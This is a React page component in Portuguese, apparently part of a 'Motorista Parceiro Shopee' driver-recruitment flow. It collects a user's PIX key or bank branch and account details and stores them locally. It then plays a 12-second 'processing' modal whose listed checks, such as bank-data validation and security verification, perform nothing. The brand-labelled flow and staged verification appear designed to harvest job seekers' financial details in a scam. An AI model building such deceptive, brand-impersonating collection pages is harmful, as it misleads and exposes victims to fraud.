import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

// Definindo os schemas e tipos para validação de formulário
const pixSchema = z.object({
  tipoChave: z.enum(['cpf', 'email', 'telefone', 'aleatoria']),
  chave: z.string().min(1, "A chave PIX é obrigatória"),
});

const tedSchema = z.object({
  banco: z.string().min(3, "Banco inválido"),
  agencia: z.string().min(4, "Agência inválida"),
  conta: z.string().min(5, "Conta inválida"),
  tipoConta: z.enum(['corrente', 'poupanca']),
});

type PixFormValues = z.infer<typeof pixSchema>;
type TedFormValues = z.infer<typeof tedSchema>;

// Tipos de método de pagamento
enum MetodoPagamento {
  PIX = 'pix',
  TED = 'ted',
  NENHUM = 'nenhum'
}

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [metodo, setMetodo] = useState<MetodoPagamento>(MetodoPagamento.NENHUM);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [candidatoData, setCandidatoData] = useState<any>(null);
  
  // Lista dos 6 maiores bancos do Brasil
  const principaisBancos = [
    "Banco do Brasil",
    "Caixa Econômica Federal",
    "Bradesco",
    "Itaú Unibanco",
    "Santander",
    "Nubank"
  ];

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);
  
  // Form para PIX
  const pixForm = useForm<PixFormValues>({
    resolver: zodResolver(pixSchema),
    defaultValues: {
      tipoChave: 'cpf',
      chave: '',
    }
  });

  // Form para TED
  const tedForm = useForm<TedFormValues>({
    resolver: zodResolver(tedSchema),
    defaultValues: {
      banco: principaisBancos[0],
      agencia: '',
      conta: '',
      tipoConta: 'corrente',
    }
  });
  
  // Preencher automaticamente o campo chave PIX quando o tipo de chave muda
  useEffect(() => {
    const tipoChave = pixForm.watch('tipoChave');
    
    if (candidatoData && tipoChave === 'cpf' && candidatoData.cpf) {
      pixForm.setValue('chave', candidatoData.cpf);
    } else if (candidatoData && tipoChave === 'email' && candidatoData.email) {
      pixForm.setValue('chave', candidatoData.email);
    } else if (tipoChave === 'telefone' || tipoChave === 'aleatoria') {
      pixForm.setValue('chave', '');
    }
  }, [pixForm.watch('tipoChave'), candidatoData, pixForm]);

  const handlePixSubmit = (data: PixFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.PIX,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleTedSubmit = (data: TedFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.TED,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    navigate('/finalizacao');
  };

  const getInputMode = (tipoChave: string) => {
    switch (tipoChave) {
      case 'cpf':
      case 'telefone':
        return 'numeric';
      case 'email':
      case 'aleatoria':
      default:
        return 'text';
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5] text-sm font-['Roboto',sans-serif]">
      <header 
        className="bg-white py-2 px-4 flex items-center rounded-b-sm"
        style={{ 
          boxShadow: "0 4px 10px -3px rgba(0, 0, 0, 0.2)"
        }}
      >
        <a href="/" className="text-[#EF4444] text-xl">
          <i className="fas fa-arrow-left"></i>
        </a>
        <h1 className="text-lg font-normal text-center flex-grow text-[#10172A]">Motorista Parceiro Shopee</h1>
      </header>
      
      <div className="bg-[#F5F5F5] h-[10px]"></div>
      
      <div className="w-full bg-white">
        <div className="bg-[#F5F5F5] p-3">
          <p className="text-[#6E6E6E] text-xs translate-y-1">Método de Recebimento</p>
        </div>
        
        <div className="p-3 border-b border-gray-200">
          <p className="text-[#212121] text-sm mb-4">
            Como você deseja receber os pagamentos das suas entregas?
          </p>
        </div>
        
        <div className="p-3 border-b border-gray-200">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div 
              className={`cursor-pointer transition-all p-3 border rounded-sm flex flex-col items-center text-center ${
                metodo === MetodoPagamento.PIX ? 'border-[#EF4444] bg-[#FFF8F6]' : 'border-gray-200 hover:bg-gray-50'
              }`}
              onClick={() => setMetodo(MetodoPagamento.PIX)}
            >
              <div className="w-12 h-12 rounded-full flex items-center justify-center mb-3">
                <img 
                  src="https://img.icons8.com/fluent/512/pix.png" 
                  alt="Ícone PIX" 
                  className="w-12 h-12"
                />
              </div>
              <h3 className="text-sm font-medium text-[#212121] mb-1">Via PIX</h3>
              <p className="text-[#6E6E6E] text-xs">
                Receba o pagamento diretamente na sua conta via PIX.
                Transferência instantânea e sem taxas.
              </p>
            </div>
            
            <div 
              className={`cursor-pointer transition-all p-3 border rounded-sm flex flex-col items-center text-center ${
                metodo === MetodoPagamento.TED ? 'border-[#EF4444] bg-[#FFF8F6]' : 'border-gray-200 hover:bg-gray-50'
              }`}
              onClick={() => setMetodo(MetodoPagamento.TED)}
            >
              <div className="w-12 h-12 bg-[#EF4444] rounded-full flex items-center justify-center mb-3 text-white">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                  <line x1="2" y1="10" x2="22" y2="10"></line>
                </svg>
              </div>
              <h3 className="text-sm font-medium text-[#212121] mb-1">Via TED Bancária</h3>
              <p className="text-[#6E6E6E] text-xs">
                Receba o pagamento na sua conta bancária por transferência eletrônica.
                Disponível para todos os bancos.
              </p>
            </div>
          </div>
        </div>
        
        {metodo === MetodoPagamento.PIX && (
          <>
            <div className="bg-[#F5F5F5] p-3">
              <p className="text-[#6E6E6E] text-xs translate-y-1">Informações PIX</p>
            </div>
            
            <form onSubmit={pixForm.handleSubmit(handlePixSubmit)}>
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="tipoChave" className="block text-[#212121] text-sm mb-2">
                  Tipo de chave
                </label>
                <Select
                  onValueChange={(value) => pixForm.setValue('tipoChave', value as any)}
                  defaultValue={pixForm.watch('tipoChave')}
                >
                  <SelectTrigger className="w-full text-[#212121] border-gray-200">
                    <SelectValue placeholder="Selecione o tipo de chave PIX" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="cpf">CPF</SelectItem>
                    <SelectItem value="email">E-mail</SelectItem>
                    <SelectItem value="telefone">Telefone</SelectItem>
                    <SelectItem value="aleatoria">Chave Aleatória</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="chave" className="block text-[#212121] text-sm mb-2">
                  Chave PIX
                </label>
                <Input
                  id="chave"
                  {...pixForm.register('chave')}
                  placeholder="Digite sua chave PIX"
                  className={`text-[#212121] placeholder-[#969696] bg-transparent focus:outline-none ${
                    pixForm.formState.errors.chave ? 'border-red-500' : 'border-gray-200'
                  }`}
                  inputMode={getInputMode(pixForm.watch('tipoChave')) as any}
                />
                {pixForm.formState.errors.chave && (
                  <p className="mt-1 text-xs text-red-600">{pixForm.formState.errors.chave.message}</p>
                )}
              </div>
              
              <div className="p-3">
                <Button
                  type="submit"
                  className="w-full bg-[#EF4444] hover:bg-[#D43C1E] text-white py-2 rounded-sm"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? 'Processando...' : 'Confirmar PIX'}
                </Button>
              </div>
            </form>
          </>
        )}
        
        {metodo === MetodoPagamento.TED && (
          <>
            <div className="bg-[#F5F5F5] p-3">
              <p className="text-[#6E6E6E] text-xs translate-y-1">Dados Bancários</p>
            </div>
            
            <form onSubmit={tedForm.handleSubmit(handleTedSubmit)}>
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="banco" className="block text-[#212121] text-sm mb-2">
                  Banco
                </label>
                <Select
                  onValueChange={(value) => tedForm.setValue('banco', value)}
                  defaultValue={tedForm.watch('banco')}
                >
                  <SelectTrigger className="w-full text-[#212121] border-gray-200">
                    <SelectValue placeholder="Selecione seu banco" />
                  </SelectTrigger>
                  <SelectContent>
                    {principaisBancos.map((banco, index) => (
                      <SelectItem key={index} value={banco}>{banco}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {tedForm.formState.errors.banco && (
                  <p className="mt-1 text-xs text-red-600">{tedForm.formState.errors.banco.message}</p>
                )}
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="agencia" className="block text-[#212121] text-sm mb-2">
                  Agência
                </label>
                <Input
                  id="agencia"
                  {...tedForm.register('agencia')}
                  placeholder="Número da agência (sem dígito)"
                  className={`text-[#212121] placeholder-[#969696] bg-transparent focus:outline-none ${
                    tedForm.formState.errors.agencia ? 'border-red-500' : 'border-gray-200'
                  }`}
                  inputMode="numeric"
                />
                {tedForm.formState.errors.agencia && (
                  <p className="mt-1 text-xs text-red-600">{tedForm.formState.errors.agencia.message}</p>
                )}
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="conta" className="block text-[#212121] text-sm mb-2">
                  Conta
                </label>
                <Input
                  id="conta"
                  {...tedForm.register('conta')}
                  placeholder="Número da conta com dígito"
                  className={`text-[#212121] placeholder-[#969696] bg-transparent focus:outline-none ${
                    tedForm.formState.errors.conta ? 'border-red-500' : 'border-gray-200'
                  }`}
                  inputMode="numeric"
                />
                {tedForm.formState.errors.conta && (
                  <p className="mt-1 text-xs text-red-600">{tedForm.formState.errors.conta.message}</p>
                )}
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <label htmlFor="tipoConta" className="block text-[#212121] text-sm mb-2">
                  Tipo de conta
                </label>
                <Select
                  onValueChange={(value) => tedForm.setValue('tipoConta', value as any)}
                  defaultValue={tedForm.watch('tipoConta')}
                >
                  <SelectTrigger className="w-full text-[#212121] border-gray-200">
                    <SelectValue placeholder="Selecione o tipo de conta" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="corrente">Conta Corrente</SelectItem>
                    <SelectItem value="poupanca">Conta Poupança</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="p-3">
                <Button
                  type="submit"
                  className="w-full bg-[#EF4444] hover:bg-[#D43C1E] text-white py-2 rounded-sm"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? 'Processando...' : 'Confirmar dados bancários'}
                </Button>
              </div>
            </form>
          </>
        )}
      </div>
      
      <div className="pb-[50px]"></div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Processando Informações"
        loadingSteps={[
          "Validando dados bancários",
          "Registrando método de recebimento",
          "Configurando conta para pagamentos",
          "Verificando segurança das informações",
          "Concluindo registro financeiro"
        ]}
        completionMessage="Método de pagamento registrado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Recebedor;